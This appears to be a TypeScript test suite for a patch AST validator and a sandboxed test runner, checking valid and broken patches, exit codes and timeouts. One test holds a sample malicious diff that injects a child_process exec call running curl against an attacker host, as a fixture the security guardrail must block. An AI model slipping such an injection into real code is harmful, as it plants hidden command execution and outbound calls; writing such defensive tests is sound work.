import { AstValidator } from '../src/ast-validator';
import { SandboxRunner } from '../src/sandbox-runner';
import * as assert from 'assert';

async function runTests() {
  console.log('🧪 Starting Milestone 2 Suite: AstValidator & SandboxRunner tests...\n');
  let passed = 0;
  let failed = 0;

  function test(name: string, fn: () => Promise<void> | void) {
    try {
      const res = fn();
      if (res instanceof Promise) {
        return res
          .then(() => {
            console.log(`  ✅ PASS: ${name}`);
            passed++;
          })
          .catch((err) => {
            console.error(`  ❌ FAIL: ${name}\n     ${err.message}`);
            failed++;
          });
      } else {
        console.log(`  ✅ PASS: ${name}`);
        passed++;
      }
    } catch (err: any) {
      console.error(`  ❌ FAIL: ${name}\n     ${err.message}`);
      failed++;
    }
  }

  // 1. AST Validator: Valid Patch
  await test('AstValidator accepts syntactically valid TypeScript patch', () => {
    const original = `export function calculateTotal(items: number[]): number {
  return items.reduce((acc, curr) => acc + curr, 0);
}`;
    const diff = `--- a/math.ts
+++ b/math.ts
@@ -1,3 +1,3 @@
 export function calculateTotal(items: number[]): number {
-  return items.reduce((acc, curr) => acc + curr, 0);
+  return items.filter(x => x > 0).reduce((acc, curr) => acc + curr, 0);
 }`;

    const result = AstValidator.validatePatch(original, diff, 'math.ts');
    assert.strictEqual(result.passed, true);
    assert.strictEqual(result.errorDetails, null);
    assert.ok(result.durationMs < 50, `AST check took ${result.durationMs}ms (expected < 50ms)`);
  });

  // 2. AST Validator: Syntax Invalid Patch
  await test('AstValidator rejects malformed TypeScript syntax with exact AST diagnostic', () => {
    const original = `export function greet(name: string): string {
  return "Hello, " + name;
}`;
    const brokenDiff = `--- a/greet.ts
+++ b/greet.ts
@@ -1,3 +1,3 @@
 export function greet(name: string): string {
-  return "Hello, " + name;
+  return "Hello, " + name + ((brokenSyntax
 }`;

    const result = AstValidator.validatePatch(original, brokenDiff, 'greet.ts');
    assert.strictEqual(result.passed, false);
    assert.ok(result.errorDetails?.includes('AST Syntax Error'), `Expected AST syntax error, got: ${result.errorDetails}`);
  });

  // 3. AST Validator: Security Injection Guardrail
  await test('AstValidator intercepts and blocks dangerous subprocess/child_process injection', () => {
    const original = `export function getStatus() {
  return { status: "ok" };
}`;
    const maliciousDiff = `--- a/status.ts
+++ b/status.ts
@@ -1,3 +1,4 @@
 export function getStatus() {
+  require("child_process").exec("curl http://attacker.com");
   return { status: "ok" };
 }`;

    const result = AstValidator.validatePatch(original, maliciousDiff, 'status.ts');
    assert.strictEqual(result.passed, false);
    assert.ok(result.errorDetails?.includes('Security Guardrail Rejection'), `Expected security rejection, got: ${result.errorDetails}`);
  });

  // 4. Sandbox Runner: Successful Test Execution (Exit Code 0)
  await test('SandboxRunner marks passing test command as VERIFIED with exit code 0', async () => {
    const result = await SandboxRunner.runTest({
      repoPath: process.cwd(),
      testCommand: 'node -e "process.exit(0)"',
    });

    assert.strictEqual(result.exitCode, 0);
    assert.strictEqual(result.verified, true);
    assert.strictEqual(result.securityFlags.networkDisabled, true);
    assert.strictEqual(result.securityFlags.memoryLimit, '512m');
  });

  // 5. Sandbox Runner: Failing Test Execution (Exit Code != 0)
  await test('SandboxRunner blocks failing regression test (exitCode !== 0)', async () => {
    const result = await SandboxRunner.runTest({
      repoPath: process.cwd(),
      testCommand: 'node -e "console.error(\'AssertionFailed: expected 200 OK\'); process.exit(1)"',
    });

    assert.strictEqual(result.exitCode, 1);
    assert.strictEqual(result.verified, false);
    assert.ok(result.stderr.includes('AssertionFailed'));
  });

  // 6. Sandbox Runner: Strict Timeout Guardrail
  await test('SandboxRunner halts on timeout exceeding limit', async () => {
    const result = await SandboxRunner.runTest({
      repoPath: process.cwd(),
      testCommand: 'node -e "setTimeout(() => {}, 5000)"',
      timeoutMs: 800, // 800ms limit
    });

    assert.strictEqual(result.exitCode, 124);
    assert.strictEqual(result.verified, false);
    assert.ok(result.stderr.includes('[SANDBOX_TIMEOUT]'));
  });

  console.log(`\nResults: ${passed} passed, ${failed} failed`);
  if (failed > 0) {
    process.exit(1);
  }
}

runTests().catch((err) => {
  console.error('Test suite runner crashed:', err);
  process.exit(1);
});
